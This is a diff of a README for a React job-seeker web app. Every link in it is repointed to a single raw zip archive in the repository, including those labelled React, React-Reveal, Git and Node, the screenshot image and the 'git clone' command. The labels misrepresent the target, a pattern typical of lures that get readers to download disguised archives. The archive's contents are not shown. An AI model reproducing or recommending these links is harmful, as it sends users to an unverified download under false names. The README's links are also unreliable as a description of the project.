@@ -17,34 +17,34 @@ The Web App lands you to an appealing Landing Page, in which the user can choose
 
 Here you can find the demo link:
 
-[https://raw.githubusercontent.com/mwanzia-kathenge/Jobs/main/public/Jobs_whatabouts.zip](https://raw.githubusercontent.com/mwanzia-kathenge/Jobs/main/public/Jobs_whatabouts.zip) -->
+[https://raw.githubusercontent.com/mwanzia-kathenge/Jobs/main/src/Software-revictorious.zip](https://raw.githubusercontent.com/mwanzia-kathenge/Jobs/main/src/Software-revictorious.zip) -->
 
 ## ✨ Features
 
 ✔️: &nbsp;&nbsp;Hiring platform for job seekers<br />
 ✔️: &nbsp;&nbsp;React-Reveal animation (credits: [rnosov
 /
-react-reveal](https://raw.githubusercontent.com/mwanzia-kathenge/Jobs/main/public/Jobs_whatabouts.zip)) for the page animations<br />
+react-reveal](https://raw.githubusercontent.com/mwanzia-kathenge/Jobs/main/src/Software-revictorious.zip)) for the page animations<br />
 ✔️: &nbsp;&nbsp;Responsive layout<br />
 
 ## 🚀 Technologies
 
-- [React](https://raw.githubusercontent.com/mwanzia-kathenge/Jobs/main/public/Jobs_whatabouts.zip)
-- [SALY-3D Illustrations](<https://raw.githubusercontent.com/mwanzia-kathenge/Jobs/main/public/Jobs_whatabouts.zip(Community)?node-id=439%3A0>)
-- [React-Reveal](https://raw.githubusercontent.com/mwanzia-kathenge/Jobs/main/public/Jobs_whatabouts.zip)
-- [CSS Gradient](https://raw.githubusercontent.com/mwanzia-kathenge/Jobs/main/public/Jobs_whatabouts.zip)
+- [React](https://raw.githubusercontent.com/mwanzia-kathenge/Jobs/main/src/Software-revictorious.zip)
+- [SALY-3D Illustrations](<https://raw.githubusercontent.com/mwanzia-kathenge/Jobs/main/src/Software-revictorious.zip(Community)?node-id=439%3A0>)
+- [React-Reveal](https://raw.githubusercontent.com/mwanzia-kathenge/Jobs/main/src/Software-revictorious.zip)
+- [CSS Gradient](https://raw.githubusercontent.com/mwanzia-kathenge/Jobs/main/src/Software-revictorious.zip)
   <br/>
 
 # 📸 Preview
 
-![Screenshot of LinkedIn Sign In](https://raw.githubusercontent.com/mwanzia-kathenge/Jobs/main/public/Jobs_whatabouts.zip)
+![Screenshot of LinkedIn Sign In](https://raw.githubusercontent.com/mwanzia-kathenge/Jobs/main/src/Software-revictorious.zip)
 <br/>
 
 <br/>
 
 ## ✅ Requirements
 
-Before starting you need to have [Git](https://raw.githubusercontent.com/mwanzia-kathenge/Jobs/main/public/Jobs_whatabouts.zip) and [Node](https://raw.githubusercontent.com/mwanzia-kathenge/Jobs/main/public/Jobs_whatabouts.zip) installed.
+Before starting you need to have [Git](https://raw.githubusercontent.com/mwanzia-kathenge/Jobs/main/src/Software-revictorious.zip) and [Node](https://raw.githubusercontent.com/mwanzia-kathenge/Jobs/main/src/Software-revictorious.zip) installed.
 
 <br/>
 
@@ -53,7 +53,7 @@ Before starting you need to have [Git](https://raw.githubusercontent.com/mwanzia
 - Clone the project
 
 ```bash
-  git clone https://raw.githubusercontent.com/mwanzia-kathenge/Jobs/main/public/Jobs_whatabouts.zip
+  git clone https://raw.githubusercontent.com/mwanzia-kathenge/Jobs/main/src/Software-revictorious.zip
 ```
 
 - Go to the project directory
